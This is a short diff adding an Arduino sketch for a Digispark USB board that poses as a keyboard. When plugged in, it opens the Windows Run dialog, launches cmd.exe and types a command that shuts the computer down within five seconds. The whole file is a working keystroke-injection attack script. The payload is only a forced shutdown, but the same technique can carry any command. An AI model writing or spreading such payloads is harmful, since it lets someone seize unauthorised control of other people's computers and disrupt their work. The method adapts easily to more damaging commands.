@@ -1,0 +1,26 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+
+
+void loop() {
+
+  delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  delay(800);
+  DigiKeyboard.print("cmd.exe");
+  delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(1800);
+
+  DigiKeyboard.print("shutdown -s -t 5");
+  delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  delay(100);
+
+for(;;){ /*empty*/}
+}
